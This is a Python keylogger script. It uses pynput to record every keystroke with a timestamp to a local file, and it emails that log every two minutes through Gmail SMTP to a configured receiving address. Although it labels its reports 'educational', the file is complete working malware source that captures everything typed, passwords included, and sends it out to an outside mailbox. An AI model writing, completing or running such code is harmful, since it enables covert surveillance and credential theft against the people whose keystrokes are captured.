from pynput import keyboard
from datetime import datetime
import smtplib
from email.message import EmailMessage
import os
import threading

# ---------------- CONFIG ----------------
LOG_FILE = "key_log.txt"
EMAIL_INTERVAL = 120  # 2 minutes

SENDER_EMAIL = "your_email@gmail.com"
APP_PASSWORD = "your_app_password"   # Gmail App Password
RECEIVER_EMAIL = "receiver_email@gmail.com"
# ---------------------------------------

running = True
email_timer = None

print("Keyboard logger started.")
print("Email will be sent every 2 minutes.")
print("Press ESC to stop.\n")


def send_email():
    global email_timer

    if not running:
        return

    if not os.path.exists(LOG_FILE):
        return

    try:
        msg = EmailMessage()
        msg["Subject"] = "Educational Key Log Report"
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECEIVER_EMAIL
        msg.set_content("Educational keyboard log attached.")

        with open(LOG_FILE, "r", encoding="utf-8") as f:
            log_data = f.read()

        # ✅ CORRECT attachment handling
        msg.add_attachment(
            log_data.encode("utf-8"),
            maintype="text",
            subtype="plain",
            filename=LOG_FILE
        )

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(SENDER_EMAIL, APP_PASSWORD)
            server.send_message(msg)

        print("[+] Email sent")

    except Exception as e:
        print("[-] Email failed:", e)

    # Schedule next email
    email_timer = threading.Timer(EMAIL_INTERVAL, send_email)
    email_timer.start()


def on_press(key):
    try:
        key_pressed = key.char
    except AttributeError:
        key_pressed = str(key)

    log_entry = f"{datetime.now()} - {key_pressed}"
    print(log_entry)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")


def on_release(key):
    global running
    if key == keyboard.Key.esc:
        print("\nKeyboard logger stopped.")
        running = False

        if email_timer:
            email_timer.cancel()

        send_email()  # Final email
        return False


# Start periodic emailing
send_email()

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()

